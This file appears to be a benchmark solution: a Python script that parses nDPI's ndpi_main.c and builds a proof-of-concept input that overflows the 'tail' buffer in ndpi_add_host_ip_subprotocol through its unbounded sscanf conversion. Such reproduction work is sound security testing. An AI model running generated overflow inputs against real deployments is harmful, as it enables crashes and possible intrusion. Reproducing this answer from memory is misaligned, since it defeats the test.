import os
import tarfile
import tempfile
import re
import codecs
import string


def find_file(root, filename):
    for dirpath, _, files in os.walk(root):
        if filename in files:
            return os.path.join(dirpath, filename)
    return None


def extract_function_body(code, func_name):
    pattern = re.compile(re.escape(func_name) + r'\s*\(')
    for m in pattern.finditer(code):
        start_idx = m.start()
        paren_start = code.find('(', start_idx)
        if paren_start == -1:
            continue
        depth = 1
        i = paren_start + 1
        n = len(code)
        while i < n and depth > 0:
            c = code[i]
            if c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
            i += 1
        if depth != 0:
            continue
        after_paren = i
        j = after_paren
        while j < n and code[j].isspace():
            j += 1
        if j < n and code[j] == ';':
            continue
        if j < n and code[j] != '{':
            while j < n and code[j] not in '{;':
                j += 1
            if j >= n or code[j] != '{':
                continue
        if j >= n or code[j] != '{':
            continue
        brace_start = j
        depth = 1
        k = brace_start + 1
        while k < n and depth > 0:
            c = code[k]
            if c == '{':
                depth += 1
            elif c == '}':
                depth -= 1
            k += 1
        if depth != 0:
            continue
        return code[brace_start:k]
    return None


def parse_tail_buf_size(func_body):
    m = re.search(r'\bchar\s+tail\s*\[\s*([^\]]+)\]', func_body)
    if not m:
        return 64
    inside = m.group(1)
    m2 = re.search(r'(\d+)', inside)
    if m2:
        return int(m2.group(1))
    return 64


def split_args(arg_str):
    args = []
    buf = []
    depth = 0
    in_str = False
    esc = False
    for ch in arg_str:
        if in_str:
            buf.append(ch)
            if esc:
                esc = False
            elif ch == '\\':
                esc = True
            elif ch == '"':
                in_str = False
            continue
        if ch == '"':
            in_str = True
            buf.append(ch)
            continue
        if ch == '(':
            depth += 1
        elif ch == ')':
            if depth > 0:
                depth -= 1
        if ch == ',' and depth == 0:
            args.append(''.join(buf).strip())
            buf = []
        else:
            buf.append(ch)
    if buf:
        args.append(''.join(buf).strip())
    return args


def extract_c_string_literal(arg):
    parts = []
    i = 0
    n = len(arg)
    while i < n:
        while i < n and arg[i] != '"':
            i += 1
        if i >= n:
            break
        j = i + 1
        esc = False
        while j < n:
            ch = arg[j]
            if esc:
                esc = False
                j += 1
            else:
                if ch == '\\':
                    esc = True
                    j += 1
                elif ch == '"':
                    break
                else:
                    j += 1
        if j >= n:
            break
        literal = arg[i + 1:j]
        try:
            decoded = codecs.decode(literal, 'unicode_escape')
        except Exception:
            try:
                decoded = literal.encode('utf-8').decode('unicode_escape')
            except Exception:
                decoded = literal.replace(r'\"', '"').replace(r'\n', '\n').replace(r'\t', '\t').replace(r'\\', '\\')
        parts.append(decoded)
        i = j + 1
    return ''.join(parts)


def parse_scanf_format(fmt):
    convs = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] == '%':
            if i + 1 < n and fmt[i + 1] == '%':
                i += 2
                continue
            start = i
            i += 1
            assign = True
            if i < n and fmt[i] == '*':
                assign = False
                i += 1
            width_str = ''
            while i < n and fmt[i].isdigit():
                width_str += fmt[i]
                i += 1
            width = int(width_str) if width_str else None
            while i < n and fmt[i] in "hljztLq":
                i += 1
            if i < n and fmt[i] == '[':
                j = i + 1
                if j < n and fmt[j] == '^':
                    j += 1
                if j < n and fmt[j] == ']':
                    j += 1
                while j < n and fmt[j] != ']':
                    j += 1
                if j < n:
                    j += 1
                end = j
                spec = fmt[start:end]
                convs.append({
                    'spec': spec,
                    'assign': assign,
                    'convchar': '[',
                    'width': width,
                    'start': start,
                    'end': end
                })
                i = j
            else:
                if i < n:
                    convchar = fmt[i]
                    i += 1
                else:
                    convchar = None
                end = i
                spec = fmt[start:end]
                convs.append({
                    'spec': spec,
                    'assign': assign,
                    'convchar': convchar,
                    'width': width,
                    'start': start,
                    'end': end
                })
        else:
            i += 1
    return convs


def choose_char_for_charclass(spec, default='A'):
    m = re.search(r'\[([^]]*)\]', spec)
    if not m:
        return default
    content = m.group(1)
    neg = content.startswith('^')
    charset_def = content[1:] if neg else content
    allowed = set()
    i = 0
    n = len(charset_def)
    while i < n:
        ch = charset_def[i]
        if i + 2 < n and charset_def[i + 1] == '-':
            start = charset_def[i]
            end = charset_def[i + 2]
            try:
                s_ord = ord(start)
                e_ord = ord(end)
                if s_ord <= e_ord:
                    for code in range(s_ord, e_ord + 1):
                        allowed.add(chr(code))
            except Exception:
                allowed.add(start)
                allowed.add(end)
            i += 3
        else:
            allowed.add(ch)
            i += 1
    candidates = string.ascii_letters + string.digits + '_'
    if not neg:
        for ch in candidates:
            if ch in allowed:
                return ch
        return default
    else:
        for ch in candidates:
            if ch not in allowed:
                return ch
        return default


def sample_for_conv(conv, is_tail, tail_buf_size):
    c = conv['convchar']
    width = conv['width']
    if tail_buf_size is None or tail_buf_size <= 0:
        tail_buf_size = 32
    tail_target = max(tail_buf_size * 2, tail_buf_size + 16, 64)
    tail_target = min(tail_target, 4096)
    if width is not None:
        if is_tail:
            if width <= tail_buf_size:
                length = width
            else:
                length = min(width, tail_target)
        else:
            length = min(width, 8)
    else:
        if is_tail:
            length = tail_target
        else:
            length = 8
    if c == 'n':
        return ''
    if c in ('d', 'i', 'u', 'o', 'x', 'X'):
        return '1'
    if c in ('f', 'F', 'e', 'E', 'g', 'G', 'a', 'A'):
        return '1.0'
    if c == 'c':
        return 'C' * max(1, min(length, 4))
    if c == 's':
        ch = 'T' if is_tail else 'S'
        if is_tail:
            return ch * max(1, length)
        else:
            return ch
    if c == '[':
        ch = choose_char_for_charclass(conv['spec'], default=('T' if is_tail else 'S'))
        if is_tail:
            return ch * max(1, length)
        else:
            return ch
    if c == 'p':
        return '1'
    if is_tail:
        return 'T' * max(1, length)
    return '1'


def transform_literal_for_scanf(lit):
    if not lit:
        return ''
    res = []
    in_ws = False
    for ch in lit:
        if ch.isspace():
            if not in_ws:
                res.append(' ')
                in_ws = True
        else:
            res.append(ch)
            in_ws = False
    return ''.join(res)


def generate_input_from_format(fmt, tail_conv_idx, tail_buf_size):
    convs = parse_scanf_format(fmt)
    out = []
    idx = 0
    for i, conv in enumerate(convs):
        lit = fmt[idx:conv['start']]
        out.append(transform_literal_for_scanf(lit))
        is_tail = (i == tail_conv_idx)
        sample = sample_for_conv(conv, is_tail, tail_buf_size)
        out.append(sample)
        idx = conv['end']
    out.append(transform_literal_for_scanf(fmt[idx:]))
    s = ''.join(out)
    if not s:
        s = 'A' * max(tail_buf_size + 16, 64)
    return s


def find_tail_sscanf(func_body, tail_buf_size):
    best = None
    for match in re.finditer(r'sscanf\s*\((.*?)\);', func_body, re.DOTALL):
        inside = match.group(1)
        args = split_args(inside)
        if len(args) < 3:
            continue
        param_exprs = args[2:]
        tail_idx = -1
        for i, expr in enumerate(param_exprs):
            if re.search(r'\btail\b', expr):
                tail_idx = i
                break
        if tail_idx == -1:
            continue
        fmt_arg = args[1]
        fmt_str = extract_c_string_literal(fmt_arg)
        if not fmt_str:
            continue
        convs = parse_scanf_format(fmt_str)
        conv_indices = [i for i, c in enumerate(convs) if c['assign']]
        if len(conv_indices) <= tail_idx:
            continue
        tail_conv_idx = conv_indices[tail_idx]
        conv = convs[tail_conv_idx]
        width = conv['width']
        vulnerable = (width is None) or (width > tail_buf_size)
        info = {
            'format': fmt_str,
            'tail_conv_idx': tail_conv_idx,
            'width': width,
            'vulnerable': vulnerable
        }
        if vulnerable:
            return info
        if best is None:
            best = info
    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="ndpi_poc_")
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
        except Exception:
            # Fallback: arbitrary long string
            return b'A' * 64

        ndpi_main_path = find_file(tmpdir, 'ndpi_main.c')
        if not ndpi_main_path:
            return b'A' * 64

        try:
            with open(ndpi_main_path, 'r', encoding='latin1', errors='ignore') as f:
                code = f.read()
        except Exception:
            return b'A' * 64

        func_body = extract_function_body(code, 'ndpi_add_host_ip_subprotocol')
        if not func_body:
            return b'A' * 64

        tail_buf_size = parse_tail_buf_size(func_body)
        scanf_info = find_tail_sscanf(func_body, tail_buf_size)
        if not scanf_info:
            return b'A' * max(tail_buf_size + 16, 64)

        fmt = scanf_info['format']
        tail_conv_idx = scanf_info['tail_conv_idx']
        what_to_add = generate_input_from_format(fmt, tail_conv_idx, tail_buf_size)

        try:
            return what_to_add.encode('ascii', 'replace')
        except Exception:
            return what_to_add.encode('latin1', 'replace')